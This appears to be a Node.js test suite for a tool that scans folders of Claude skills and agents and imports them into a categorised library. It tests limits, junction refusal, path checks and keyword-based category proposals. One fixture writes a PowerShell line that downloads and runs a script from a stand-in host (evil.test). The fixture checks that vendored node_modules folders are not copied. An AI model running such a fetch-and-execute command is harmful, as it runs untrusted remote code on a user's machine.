// Library tests: reading the library folders, scanning a folder to import, the category proposal and the import
// itself (docs/skills-flow.md §2, §6). Run: node --test test/library.test.mjs
// Hermetic: a fake hub, fake home and fake source folders under the system temp folder; nothing real is read.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { createActions } from '../server/actions.mjs';
import { createHandler } from '../server/app.mjs';
import { PUBLIC_DIR } from '../server/config.mjs';
import { initHub } from '../server/hub.mjs';
import { Catalog } from '../server/catalog.mjs';
import { CATEGORIES, CATEGORY_KEYWORDS, LIMITS, OVER_LIMIT, LEFTOVER_RE, listLibrary, libraryItems, isLegacyHub, scanSource, checkSource, proposeCategory, planImport, executeImport, normRel, validName, treeHash, measureTree, sizeProblem, placeCopy, realPath, writeCatalog } from '../server/library.mjs';
import { sweepLeftovers } from '../server/install.mjs';

const ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'ork-library-'));
after(() => fs.rmSync(ROOT, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }));
const HOME = path.join(ROOT, 'home');
fs.mkdirSync(path.join(HOME, '.claude'), { recursive: true });

const write = (file, text) => {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
};
const fm = (name, description = `${name} description`) => `---\nname: ${name}\ndescription: ${description}\n---\n\n# ${name}\n`;
const exists = (p) => fs.existsSync(p);
const junction = (target, at) => {
  fs.mkdirSync(path.dirname(at), { recursive: true });
  fs.symlinkSync(target, at, 'junction');
};
const byPath = (items) => Object.fromEntries(items.map((i) => [i.path, i]));

let n = 0;
function hub({ legacy = false } = {}) {
  const h = path.join(ROOT, `hub${++n}`);
  if (legacy) {
    write(path.join(h, 'registry', 'projeler.json'), JSON.stringify({ projeler: [] }));
    write(path.join(h, 'kutuphane', 'katalog.json'), JSON.stringify({ ogeler: [{ ad: 'old-skill', tur: 'skill', kategori: 'web' }] }));
  } else initHub(h);
  return h;
}

function snapshotTree(root) {
  const out = [];
  const walk = (d) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      const st = fs.lstatSync(p);
      out.push(`${path.relative(root, p)}|${e.isDirectory() ? 'd' : e.isSymbolicLink() ? 'l' : st.size}|${st.mtimeMs}`);
      if (e.isDirectory()) walk(p);
    }
  };
  walk(root);
  return out.sort();
}

// ---------------- library folders ----------------
test('library: the folders are the source of truth; a hand-added skill or agent is listed without catalog.json; catalog rows without a folder stay listed', () => {
  const h = hub();
  write(path.join(h, 'library', 'web', 'skills', 'folder-name', 'SKILL.md'), fm('react-kit', 'React kit'));
  write(path.join(h, 'library', 'web', 'skills', 'no-frontmatter', 'SKILL.md'), '# plain\n');
  write(path.join(h, 'library', 'web', 'skills', 'not-a-skill', 'README.md'), '# no SKILL.md');
  write(path.join(h, 'library', 'design', 'agents', 'ui-agent.md'), fm('ui-agent'));
  write(path.join(h, 'library', 'design', 'agents', 'README.md'), '# readme');
  write(path.join(h, 'library', 'my-own', 'skills', 'custom', 'SKILL.md'), fm('custom'));
  write(path.join(h, 'library', '.hidden', 'skills', 'secret', 'SKILL.md'), fm('secret'));
  // A category of the same name twice: the first category (byte order) wins
  write(path.join(h, 'library', 'zeta', 'skills', 'react-kit', 'SKILL.md'), fm('react-kit'));
  write(path.join(h, 'library', 'catalog.json'), JSON.stringify({ items: [{ name: 'catalog-only', kind: 'skill', category: 'docs', description: 'hand-made row' }, { name: 'react-kit', kind: 'skill', category: 'other' }] }));
  const list = listLibrary(h);
  assert.deepEqual(list.map((i) => `${i.kind}:${i.name}@${i.category}`), ['agent:ui-agent@design', 'skill:custom@my-own', 'skill:react-kit@web', 'skill:no-frontmatter@web']);
  const kit = list.find((i) => i.name === 'react-kit');
  assert.equal(kit.path, path.join(h, 'library', 'web', 'skills', 'folder-name'));
  assert.equal(kit.rel, 'library/web/skills/folder-name');
  assert.equal(kit.description, 'React kit');
  const all = libraryItems(h);
  assert.deepEqual(all.map((i) => i.name), ['ui-agent', 'custom', 'react-kit', 'no-frontmatter', 'catalog-only']);
  assert.equal(all.at(-1).path, null, 'a catalog row without a folder cannot be installed');
  // The roster sees them through the catalog (with the frontmatter cache)
  const c = new Catalog({ env: {}, hubDir: h, claudeDir: path.join(HOME, '.claude'), homeDir: HOME });
  c.load();
  assert.equal(c.roster.get('skill:react-kit').source, 'library');
  assert.equal(c.roster.get('skill:react-kit').category, 'web');
  assert.equal(c.roster.get('skill:catalog-only').category, 'docs');
  assert.equal(c.hub.library, 5);
  // A skill added by hand appears on the next pass, no catalog.json needed
  write(path.join(h, 'library', 'web', 'skills', 'later', 'SKILL.md'), fm('later'));
  c.load();
  assert.ok(c.roster.get('skill:later'));
  assert.equal(c.hub.library, 6);
});

test('library: a junction as a category, skills folder or skill folder is not followed', () => {
  const h = hub();
  const ext = path.join(ROOT, 'ext-lib');
  write(path.join(ext, 'skills', 'outside-skill', 'SKILL.md'), fm('outside-skill'));
  junction(ext, path.join(h, 'library', 'linked-cat'));
  junction(path.join(ext, 'skills'), path.join(h, 'library', 'web', 'skills'));
  junction(path.join(ext, 'skills', 'outside-skill'), path.join(h, 'library', 'data', 'skills', 'outside-skill'));
  assert.deepEqual(listLibrary(h), []);
});

test('legacy hub: detected from registry/projeler.json or kutuphane/katalog.json; read as before (catalog only); catalog.json is never rewritten there', () => {
  const l = hub({ legacy: true });
  assert.equal(isLegacyHub(l), true);
  write(path.join(l, 'kutuphane', 'web', 'skills', 'folder-skill', 'SKILL.md'), fm('folder-skill'));
  assert.deepEqual(libraryItems(l).map((i) => i.name), ['old-skill'], 'the legacy library is read from its catalog only');
  assert.throws(() => writeCatalog(l), /legacy-hub/);
  assert.ok(!exists(path.join(l, 'library')));
  assert.equal(isLegacyHub(hub()), false, 'a new hub is not legacy');
  assert.equal(isLegacyHub(null), false);
  // Only the old registry: legacy too
  const r = path.join(ROOT, 'legacy-reg');
  write(path.join(r, 'registry', 'projeler.json'), JSON.stringify({ projeler: [{ id: 'a', yol: 'C:\\a' }] }));
  assert.equal(isLegacyHub(r), true);
});

// ---------------- scan ----------------
function sourceWorld(name) {
  const s = path.join(ROOT, name);
  write(path.join(s, 'skills', 'alpha', 'SKILL.md'), fm('alpha', 'Unity shader helpers'));
  write(path.join(s, 'skills', 'alpha', 'scripts', 'a.txt'), 'aaa');
  write(path.join(s, 'skills', 'alpha', 'nested', 'SKILL.md'), fm('nested')); // inside a skill: part of alpha
  write(path.join(s, 'pack', '.claude', 'skills', 'beta', 'SKILL.md'), fm('beta', 'Write docs'));
  write(path.join(s, 'agents', 'gamma.md'), fm('gamma', 'Reviews security'));
  write(path.join(s, 'agents', 'README.md'), '# readme');
  write(path.join(s, 'team', 'x', 'Agents', 'delta.md'), '# no frontmatter: file name');
  write(path.join(s, 'notes', 'not-agent.md'), fm('not-agent'));
  write(path.join(s, 'node_modules', 'pkg', 'skills', 'hidden', 'SKILL.md'), fm('hidden'));
  write(path.join(s, '.git', 'skills', 'git-skill', 'SKILL.md'), fm('git-skill'));
  return s;
}

test('scan: skills (folders with SKILL.md, taken whole) and agents (*.md in an agents folder) at any depth; README, node_modules and .git skipped', () => {
  const h = hub();
  const s = sourceWorld('src-layouts');
  const r = scanSource(s, { hubDir: h, homeDir: HOME });
  assert.equal(r.ok, true);
  assert.equal(r.source, s);
  assert.equal(r.truncated, false);
  const p = byPath(r.items);
  assert.deepEqual(Object.keys(p).sort(), ['agents/gamma.md', 'pack/.claude/skills/beta', 'skills/alpha', 'team/x/Agents/delta.md']);
  assert.equal(p['skills/alpha'].kind, 'skill');
  assert.equal(p['skills/alpha'].files, 3, 'the whole folder counts (scripts/ and the nested SKILL.md included)');
  assert.equal(p['skills/alpha'].description, 'Unity shader helpers');
  assert.equal(p['agents/gamma.md'].kind, 'agent');
  assert.equal(p['team/x/Agents/delta.md'].name, 'delta', 'no frontmatter: the file name');
  assert.equal(p['pack/.claude/skills/beta'].name, 'beta');
  for (const it of r.items) {
    assert.deepEqual(Object.keys(it).sort(), ['category', 'categoryReason', 'description', 'files', 'kind', 'libraryCategory', 'links', 'name', 'path', 'problems', 'size', 'status'].sort().concat(['_abs', '_existing']).sort());
  }
  // The source itself can be one skill
  const one = path.join(ROOT, 'src-single');
  write(path.join(one, 'SKILL.md'), fm('single'));
  assert.deepEqual(scanSource(one, { hubDir: h }).items.map((i) => [i.path, i.name]), [['.', 'single']]);
  // Descriptions are cut at 400 characters
  const long = path.join(ROOT, 'src-long');
  write(path.join(long, 'skills', 'l', 'SKILL.md'), fm('l', 'x'.repeat(900)));
  assert.equal(scanSource(long, { hubDir: h }).items[0].description.length, 400);
});

test('import: .git and node_modules (at any depth, any letter case) are never copied into the library; the scan measures and compares only what is copied', () => {
  const h = hub();
  const s = path.join(ROOT, `src-vendored${++n}`);
  const dir = path.join(s, 'skills', 'vend');
  write(path.join(dir, 'SKILL.md'), fm('vend'));
  write(path.join(dir, 'scripts', 'build.txt'), 'kept');
  write(path.join(dir, 'node_modules', '.bin', 'setup.exe'), 'MZ\u0090\u0000');
  write(path.join(dir, 'node_modules', 'x', 'install.ps1'), 'iex (iwr https://evil.test/x.ps1)\n');
  write(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  write(path.join(dir, 'lib', 'Node_Modules', 'deep.js'), 'x');
  for (let i = 0; i < 6; i++) write(path.join(dir, 'node_modules', 'many', `${i}.js`), 'x');
  // Limits count only what is copied: the vendored files do not push the item over them
  const limits = { ...LIMITS, maxFiles: 4 };
  const scanned = scanSource(s, { hubDir: h, homeDir: HOME, limits });
  const it = byPath(scanned.items)['skills/vend'];
  assert.deepEqual([it.files, it.problems], [2, []], 'SKILL.md and scripts/build.txt only');
  const p = planImport({ hubDir: h, homeDir: HOME, source: s, picks: [{ path: 'skills/vend', category: 'general' }], limits });
  assert.deepEqual(p.plan.map((e) => `${e.op}:${e.reason}`), ['copy:new']);
  assert.deepEqual(executeImport({ hubDir: h, plan: p.plan, limits }), { copied: 1, updated: 0 });
  const lib = path.join(h, 'library', 'general', 'skills', 'vend');
  const tree = [];
  const walk = (d, rel) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      tree.push(r);
      if (e.isDirectory()) walk(path.join(d, e.name), r);
    }
  };
  walk(lib, '');
  assert.deepEqual(tree.sort(), ['SKILL.md', 'lib', 'scripts', 'scripts/build.txt'], 'no node_modules, no .git in the library copy');
  // Scanned again: the same content (the vendored folders are left out on both sides)
  assert.equal(byPath(scanSource(s, { hubDir: h, homeDir: HOME }).items)['skills/vend'].status, 'same');
  assert.equal(treeHash(dir, { links: 'skip', vendored: 'skip' }), treeHash(lib, { links: 'skip', vendored: 'skip' }));
});

test('scan: depth limit 6 (a skill 6 folders down is found, 7 down is not)', () => {
  const s = path.join(ROOT, 'src-depth');
  write(path.join(s, '1', '2', '3', '4', '5', 'six', 'SKILL.md'), fm('six'));
  write(path.join(s, 'a', 'b', 'c', 'd', 'e', 'f', 'seven', 'SKILL.md'), fm('seven'));
  write(path.join(s, 'q', 'r', 's', 't', 'u', 'agents', 'deep-agent.md'), fm('deep-agent'));
  write(path.join(s, 'q', 'r', 's', 't', 'u', 'v', 'agents', 'too-deep.md'), fm('too-deep'));
  const r = scanSource(s, { hubDir: hub() });
  assert.deepEqual(r.items.map((i) => i.name).sort(), ['deep-agent', 'six']);
  assert.equal(LIMITS.maxDepth, 6);
});

test('scan: a junction is never followed (neither a linked folder nor a link inside a skill); links inside a skill are counted apart', () => {
  const s = path.join(ROOT, 'src-links');
  const ext = path.join(ROOT, 'src-links-ext');
  write(path.join(ext, 'skills', 'far', 'SKILL.md'), fm('far'));
  write(path.join(ext, 'big', 'file.txt'), 'x'.repeat(1000));
  write(path.join(s, 'skills', 'near', 'SKILL.md'), fm('near'));
  junction(path.join(ext, 'skills'), path.join(s, 'linked-skills'));
  junction(path.join(ext, 'skills', 'far'), path.join(s, 'skills', 'far-link'));
  junction(path.join(ext, 'big'), path.join(s, 'skills', 'near', 'big-link'));
  junction(ext, path.join(s, 'agents'));
  const r = scanSource(s, { hubDir: hub() });
  assert.deepEqual(r.items.map((i) => i.name), ['near']);
  assert.equal(r.items[0].files, 1);
  assert.equal(r.items[0].links, 1);
  assert.equal(r.items[0].size, Buffer.byteLength(fm('near')), 'the linked file is not counted');
  // The source itself as a junction is refused
  const j = path.join(ROOT, 'src-junction-root');
  junction(s, j);
  assert.equal(scanSource(j, { hubDir: hub() }).error, 'reparse-point');
});

test('scan: limits — more than 500 files -> too-many-files, more than 20 MB -> too-large; names outside the pattern -> bad-name; duplicates marked', () => {
  const s = path.join(ROOT, 'src-limits');
  for (let i = 0; i < 500; i++) write(path.join(s, 'skills', 'five-hundred', 'f', `${i}.txt`), 'x');
  write(path.join(s, 'skills', 'five-hundred', 'SKILL.md'), fm('five-hundred'));
  for (let i = 0; i < 499; i++) write(path.join(s, 'skills', 'ok-files', 'f', `${i}.txt`), 'x');
  write(path.join(s, 'skills', 'ok-files', 'SKILL.md'), fm('ok-files'));
  write(path.join(s, 'skills', 'huge', 'SKILL.md'), fm('huge'));
  fs.writeFileSync(path.join(s, 'skills', 'huge', 'blob.bin'), Buffer.alloc(LIMITS.maxBytes));
  write(path.join(s, 'skills', 'bad', 'SKILL.md'), fm('Bad Name'));
  write(path.join(s, 'skills', 'dot', 'SKILL.md'), fm('ends.'));
  write(path.join(s, 'skills', 'dev', 'SKILL.md'), fm('con'));
  write(path.join(s, 'zz-more', 'skills', 'ok-files', 'SKILL.md'), fm('ok-files'));
  const r = scanSource(s, { hubDir: hub() });
  const p = byPath(r.items);
  assert.deepEqual(p['skills/five-hundred'].problems, ['too-many-files'], '501 files');
  assert.deepEqual(p['skills/ok-files'].problems, [], '500 files are allowed');
  assert.equal(p['skills/ok-files'].files, 500);
  assert.deepEqual(p['skills/huge'].problems, ['too-large'], 'over 20 MB');
  assert.deepEqual(p['skills/bad'].problems, ['bad-name']);
  assert.deepEqual(p['skills/dot'].problems, ['bad-name'], 'a trailing dot is dropped by Windows');
  assert.deepEqual(p['skills/dev'].problems, ['bad-name'], 'a device name');
  assert.deepEqual(p['zz-more/skills/ok-files'].problems, ['duplicate'], 'the second one found (byte order) is the duplicate');
  assert.equal(LIMITS.maxFiles, 500);
  assert.equal(LIMITS.maxBytes, 20 * 1024 * 1024);
  for (const good of ['a', 'Z9', 'my.skill', 'a_b-c', 'x'.repeat(64)]) assert.equal(validName(good), true, good);
  for (const bad of ['', '-a', '.a', '_a', 'a b', 'a/b', 'a\\b', 'x'.repeat(65), 'ş', 'a.', 'nul', 'COM1', 'lpt9.md', 42, null]) assert.equal(validName(bad), false, String(bad));
});

test('scan: status against the library — new, same (identical content), conflict (same kind and name, other content); the library category is proposed', () => {
  const h = hub();
  write(path.join(h, 'library', 'game', 'skills', 'alpha', 'SKILL.md'), fm('alpha', 'Unity shader helpers'));
  write(path.join(h, 'library', 'game', 'skills', 'alpha', 'scripts', 'a.txt'), 'aaa');
  write(path.join(h, 'library', 'game', 'skills', 'alpha', 'nested', 'SKILL.md'), fm('nested'));
  write(path.join(h, 'library', 'docs', 'skills', 'beta', 'SKILL.md'), fm('beta', 'Older docs text'));
  write(path.join(h, 'library', 'security', 'skills', 'gamma', 'SKILL.md'), fm('gamma', 'a skill named like the agent'));
  const s = sourceWorld('src-status');
  const p = byPath(scanSource(s, { hubDir: h }).items);
  assert.equal(p['skills/alpha'].status, 'same');
  assert.equal(p['pack/.claude/skills/beta'].status, 'conflict');
  assert.equal(p['pack/.claude/skills/beta'].category, 'docs');
  assert.deepEqual(p['pack/.claude/skills/beta'].categoryReason, { library: 'docs' });
  assert.equal(p['pack/.claude/skills/beta'].libraryCategory, 'docs');
  assert.equal(p['agents/gamma.md'].status, 'new', 'a skill of the same name is another kind');
  assert.equal(p['team/x/Agents/delta.md'].status, 'new');
});

test('scan: source rules — relative, UNC, device, drive root, home folder, inside the hub, missing, a file, too long or control characters are refused', () => {
  const h = hub();
  write(path.join(ROOT, 'a-file.txt'), 'x');
  const cases = [
    ['relative\\path', 400, 'bad-source'],
    ['\\\\server\\share\\skills', 400, 'bad-source'],
    ['\\\\?\\C:\\skills', 400, 'bad-source'],
    ['C:', 400, 'bad-source'],
    ['C:\\', 409, 'source-is-root'],
    ['d:/', 409, 'source-is-root'],
    [HOME, 409, 'source-is-home'],
    [HOME + '\\', 409, 'source-is-home'],
    [h, 409, 'source-in-hub'],
    [path.join(h, 'library'), 409, 'source-in-hub'],
    [path.join(ROOT, 'missing'), 404, 'source-missing'],
    [path.join(ROOT, 'a-file.txt'), 404, 'source-missing'],
    ['C:\\' + 'x'.repeat(300), 400, 'bad-source'],
    ['C:\\a\u0007b', 400, 'bad-source'],
    ['', 400, 'bad-source'],
  ];
  for (const [src, status, error] of cases) {
    const r = checkSource(src, { hubDir: h, homeDir: HOME });
    assert.equal(r.ok, false, src);
    assert.equal(r.status, status, src);
    assert.equal(r.error, error, src);
  }
  // A junction elsewhere that points into the hub is inside the hub too
  junction(path.join(h, 'library'), path.join(ROOT, 'lib-alias'));
  assert.equal(checkSource(path.join(ROOT, 'lib-alias'), { hubDir: h, homeDir: HOME }).error, 'reparse-point');
  const inner = path.join(ROOT, 'alias-parent');
  junction(h, path.join(inner, 'hub-alias'));
  assert.equal(checkSource(path.join(inner, 'hub-alias', 'library'), { hubDir: h, homeDir: HOME }).error, 'source-in-hub');
  assert.equal(checkSource(path.join(ROOT, 'src-layouts-ok'), { hubDir: h }).error, 'source-missing');
  assert.equal(checkSource(ROOT, { hubDir: h, homeDir: HOME }).ok, true);
});

// ---------------- category proposal ----------------
test('category proposal: keyword table in English and Turkish; name weighs 3, description 1; ties go to the table order; default general', () => {
  assert.deepEqual(CATEGORIES, ['web', 'mobile', 'desktop', 'game', 'data', 'ai', 'devops', 'testing', 'security', 'design', 'docs', 'general']);
  assert.deepEqual(CATEGORY_KEYWORDS.map(([c]) => c), CATEGORIES.filter((c) => c !== 'general').sort((a, b) => CATEGORY_KEYWORDS.findIndex(([x]) => x === a) - CATEGORY_KEYWORDS.findIndex(([x]) => x === b)));
  const cases = [
    ['unity-shader-kit', '', 'game', { keyword: 'unity', field: 'name' }],
    ['helper', 'Builds React components for the web', 'web', { keyword: 'web', field: 'description' }],
    ['expo-router', 'Navigation for React Native apps', 'mobile', { keyword: 'expo', field: 'name' }],
    ['electron-shell', '', 'desktop', { keyword: 'electron', field: 'name' }],
    ['sql-review', '', 'data', { keyword: 'sql', field: 'name' }],
    ['prompt-lab', 'LLM prompts', 'ai', { keyword: 'prompt', field: 'name' }],
    ['docker-deploy', '', 'devops', { keyword: 'docker', field: 'name' }],
    ['e2e-runner', 'Playwright tests', 'testing', { keyword: 'e2e', field: 'name' }],
    ['owasp-check', '', 'security', { keyword: 'owasp', field: 'name' }],
    ['figma-to-code', '', 'design', { keyword: 'figma', field: 'name' }],
    ['changelog-writer', '', 'docs', { keyword: 'changelog', field: 'name' }],
    // Turkish keywords
    ['oyun-dengesi', '', 'game', { keyword: 'oyun', field: 'name' }],
    ['kontrol', 'Güvenlik açıklarını tarar', 'security', { keyword: 'güvenlik', field: 'description' }],
    ['kontrol', 'Kodda güvenlik açığı arar', 'security', { keyword: 'güvenlik', field: 'description' }],
    ['rapor', 'Veritabanı şeması çıkarır', 'data', { keyword: 'veritabanı', field: 'description' }],
    ['arayuz-kiti', '', 'web', { keyword: 'arayuz', field: 'name' }],
    ['belge-yazici', '', 'docs', { keyword: 'belge', field: 'name' }],
    // Whole words only: "maintain" is not "ai", "citation" is not "ci"
    ['maintainer', 'Keeps citations tidy', 'general', null],
    ['nothing-here', 'Plain helper', 'general', null],
    // The name outweighs several description hits of another category
    ['unity-tool', 'web react css html', 'web', { keyword: 'web', field: 'description' }],
    ['unity-tool', 'web react', 'game', { keyword: 'unity', field: 'name' }],
    // A tie goes to the table order (game before web)
    ['unity-react', '', 'game', { keyword: 'unity', field: 'name' }],
  ];
  for (const [name, desc, category, reason] of cases) {
    const r = proposeCategory(name, desc);
    assert.equal(r.category, category, `${name} / ${desc}`);
    assert.deepEqual(r.reason, reason, `${name} / ${desc}`);
    assert.deepEqual(proposeCategory(name, desc), r, 'deterministic');
  }
});

// ---------------- import ----------------
function request(port, { method = 'GET', path: p = '/', headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const h = { Host: `127.0.0.1:${port}`, ...headers };
    const req = http.request({ host: '127.0.0.1', port, path: p, method, agent: false, headers: h }, (res) => {
      let data = '';
      res.setEncoding('utf8');
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve({ status: res.statusCode, json: JSON.parse(data || 'null') }));
    });
    req.on('error', reject);
    req.end(body === undefined ? undefined : JSON.stringify(body));
  });
}

async function startServer(hubDir, { mode = 'live', onChange = () => {}, itemOrigin } = {}) {
  let clock = Date.UTC(2026, 8, 28, 11, 0, 0);
  const server = http.createServer();
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  const catalog = { hubDir, roster: new Map(), getProject: () => null, ...(itemOrigin ? { itemOrigin } : {}) };
  const actions = createActions({ catalog, ingest: { sessions: new Map() }, mode, port, hubDir, workDir: ROOT, homeDir: HOME, claudeDir: path.join(HOME, '.claude'), now: () => clock, log: () => {}, onChange, spawn: () => assert.fail('no process in the library flow') });
  server.on('request', createHandler({ ingest: { sessions: new Map() }, catalog, clients: new Set(), port, publicDir: PUBLIC_DIR, actions }));
  const headers = { Origin: `http://127.0.0.1:${port}`, 'Sec-Fetch-Site': 'same-origin', 'Content-Type': 'application/json', 'X-SiberSentez-Token': actions.token || '' };
  return {
    tick: (ms = 3000) => (clock += ms),
    post: (body) => request(port, { method: 'POST', path: '/api/action', body, headers }),
    close: () => new Promise((r) => server.close(r)),
  };
}

test('library-scan over HTTP: statuses and proposals in result.items, an empty plan, no internal fields; nothing is written', async () => {
  const h = hub();
  const s = sourceWorld('src-http-scan');
  const before = snapshotTree(ROOT).filter((l) => l.startsWith(path.basename(h)) || l.startsWith('src-http-scan'));
  const env = await startServer(h, { mode: 'live' });
  try {
    const r = await env.post({ action: 'library-scan', source: s });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.plan, []);
    assert.equal(r.json.result.source, s);
    assert.equal(r.json.result.items.length, 4);
    assert.ok(r.json.result.items.every((i) => !('_abs' in i) && !('_existing' in i)), 'no absolute source path of an item goes out');
    assert.equal(byPath(r.json.result.items)['skills/alpha'].category, 'game');
    const bad = await env.post({ action: 'library-scan', source: 'C:\\' });
    assert.equal(bad.status, 409);
    assert.equal(bad.json.error, 'source-is-root');
  } finally {
    await env.close();
  }
  const afterSnap = snapshotTree(ROOT).filter((l) => l.startsWith(path.basename(h)) || l.startsWith('src-http-scan'));
  assert.deepEqual(afterSnap, before, 'a scan never writes, even in live mode');
});

test('library-import: dry plans only; live copies into library/<category>/skills|agents (whole folder, links skipped) and regenerates catalog.json', async () => {
  const h = hub();
  const s = sourceWorld('src-import');
  const ext = path.join(ROOT, 'src-import-ext');
  write(path.join(ext, 'secret.txt'), 'secret');
  junction(ext, path.join(s, 'skills', 'alpha', 'linked'));
  const picks = [
    { path: 'skills/alpha', category: 'game' },
    { path: 'agents/gamma.md', category: 'security' },
    { path: 'pack\\.claude\\skills\\beta', category: 'docs' },
  ];
  const dry = await startServer(h, { mode: 'dry' });
  const before = snapshotTree(h);
  try {
    const r = await dry.post({ action: 'library-import', source: s, items: picks });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.plan.map((e) => `${e.op}:${e.kind}:${e.name}:${e.category}:${e.reason}`), ['copy:skill:alpha:game:new', 'copy:agent:gamma:security:new', 'copy:skill:beta:docs:new']);
    assert.equal(r.json.plan[0].path, path.join(h, 'library', 'game', 'skills', 'alpha'));
    assert.equal(r.json.plan[1].path, path.join(h, 'library', 'security', 'agents', 'gamma.md'));
    assert.equal(r.json.plan[2].from, 'pack/.claude/skills/beta');
    assert.equal(r.json.result.executed, false);
  } finally {
    await dry.close();
  }
  assert.deepEqual(snapshotTree(h), before, 'dry wrote nothing');
  let reloads = 0;
  const live = await startServer(h, { onChange: () => reloads++ });
  try {
    const r = await live.post({ action: 'library-import', source: s, items: picks });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.result, { executed: true, copied: 3, updated: 0, catalogError: false });
    assert.ok(exists(path.join(h, 'library', 'game', 'skills', 'alpha', 'scripts', 'a.txt')));
    assert.ok(exists(path.join(h, 'library', 'game', 'skills', 'alpha', 'nested', 'SKILL.md')));
    assert.ok(!exists(path.join(h, 'library', 'game', 'skills', 'alpha', 'linked')), 'a link inside is skipped, not followed');
    assert.equal(fs.readFileSync(path.join(h, 'library', 'security', 'agents', 'gamma.md'), 'utf8'), fm('gamma', 'Reviews security'));
    const cat = JSON.parse(fs.readFileSync(path.join(h, 'library', 'catalog.json'), 'utf8'));
    assert.equal(cat.count, 3);
    assert.equal(cat.updated, '2026-09-28T11:00:00.000Z');
    assert.deepEqual(cat.items.map((i) => `${i.kind}:${i.name}:${i.category}`), ['skill:beta:docs', 'skill:alpha:game', 'agent:gamma:security']);
    assert.ok(!fs.readdirSync(path.join(h, 'library')).some((x) => x.includes('.tmp')), 'catalog.json written atomically');
    assert.equal(reloads, 1);
    // The source is untouched
    assert.ok(exists(path.join(s, 'skills', 'alpha', 'SKILL.md')));
    // Imported again: same -> skipped
    live.tick();
    const again = await live.post({ action: 'library-import', source: s, items: picks.slice(0, 1) });
    assert.deepEqual(again.json.plan.map((e) => `${e.op}:${e.reason}`), ['skip:same']);
    assert.equal(reloads, 1, 'nothing changed: no reload');
  } finally {
    await live.close();
  }
});

test('library-import: a conflict is skipped unless replace: true (replaced in place, library category kept); bad picks are skipped with a reason', async () => {
  const h = hub();
  write(path.join(h, 'library', 'docs', 'skills', 'beta', 'SKILL.md'), fm('beta', 'Old text'));
  write(path.join(h, 'library', 'docs', 'skills', 'beta', 'old-only.txt'), 'old');
  write(path.join(h, 'library', 'web', 'skills', 'taken', 'SKILL.md'), fm('something-else'));
  const s = sourceWorld('src-conflict');
  write(path.join(s, 'extra', 'taken', 'SKILL.md'), fm('taken'));
  write(path.join(s, 'bad', 'SKILL.md'), fm('bad name'));
  const env = await startServer(h);
  try {
    let r = await env.post({ action: 'library-import', source: s, items: [{ path: 'pack/.claude/skills/beta', category: 'web' }] });
    assert.deepEqual(r.json.plan.map((e) => `${e.op}:${e.reason}`), ['skip:conflict']);
    assert.equal(fs.readFileSync(path.join(h, 'library', 'docs', 'skills', 'beta', 'SKILL.md'), 'utf8'), fm('beta', 'Old text'));
    env.tick();
    r = await env.post({
      action: 'library-import',
      source: s,
      items: [
        { path: 'pack/.claude/skills/beta', category: 'web', replace: true },
        { path: '../outside', category: 'web' },
        { path: 'C:\\abs', category: 'web' },
        { path: 'skills/../skills/alpha', category: 'web' },
        { path: 'nope', category: 'web' },
        { path: 'agents/gamma.md', category: 'unknown-cat' },
        { path: 'extra/taken', category: 'web' },
        { path: 'bad', category: 'web' },
        { path: 'skills/alpha', category: 'game' },
        { path: 'skills/alpha', category: 'web' },
      ],
    });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.plan.map((e) => `${e.op}:${e.reason}`), [
      'update:replace',
      'skip:not-found',
      'skip:not-found',
      'skip:not-found',
      'skip:not-found',
      'skip:bad-category',
      'skip:exists',
      'skip:bad-name',
      'copy:new',
      'skip:duplicate',
    ]);
    assert.equal(r.json.plan[0].category, 'docs', 'replaced in place: the library category is kept');
    assert.equal(fs.readFileSync(path.join(h, 'library', 'docs', 'skills', 'beta', 'SKILL.md'), 'utf8'), fm('beta', 'Write docs'));
    assert.ok(!exists(path.join(h, 'library', 'docs', 'skills', 'beta', 'old-only.txt')), 'the old copy is replaced as a whole');
    assert.ok(!exists(path.join(h, 'library', 'web', 'skills', 'beta')));
    assert.ok(!fs.readdirSync(path.join(h, 'library', 'docs', 'skills')).some((x) => x.startsWith('.sibersentez-')));
  } finally {
    await env.close();
  }
  assert.equal(normRel('a\\b/c'), 'a/b/c');
  for (const bad of ['', '/a', '\\a', 'C:x', 'a/../b', 'a//b', './a', 'a/.', 'x'.repeat(301), 'a\u0000b', null]) assert.equal(normRel(bad), null, String(bad));
  assert.equal(normRel('.'), '.');
});

test('library-import: the size limit and a link on the way into the library are refused; a library category that is a junction is never written through', async () => {
  const h = hub();
  const s = path.join(ROOT, 'src-guard');
  write(path.join(s, 'skills', 'fine', 'SKILL.md'), fm('fine'));
  write(path.join(s, 'skills', 'huge', 'SKILL.md'), fm('huge'));
  fs.writeFileSync(path.join(s, 'skills', 'huge', 'blob.bin'), Buffer.alloc(LIMITS.maxBytes + 1));
  const outside = path.join(ROOT, 'guard-outside');
  fs.mkdirSync(outside, { recursive: true });
  junction(outside, path.join(h, 'library', 'web'));
  const env = await startServer(h);
  try {
    const r = await env.post({ action: 'library-import', source: s, items: [{ path: 'skills/fine', category: 'web' }, { path: 'skills/huge', category: 'data' }] });
    assert.deepEqual(r.json.plan.map((e) => `${e.op}:${e.reason}`), ['skip:reparse-point', 'skip:too-large']);
    assert.deepEqual(fs.readdirSync(outside), [], 'nothing was written through the junction');
    assert.ok(!exists(path.join(h, 'library', 'data')));
  } finally {
    await env.close();
  }
  // planImport is a pure plan: nothing written either way
  const p = planImport({ hubDir: h, homeDir: HOME, source: s, picks: [{ path: 'skills/fine', category: 'data' }] });
  assert.equal(p.ok, true);
  assert.equal(p.plan[0].op, 'copy');
  assert.ok(!exists(path.join(h, 'library', 'data')));
  assert.equal(treeHash(path.join(h, 'library', 'data')), null);
});

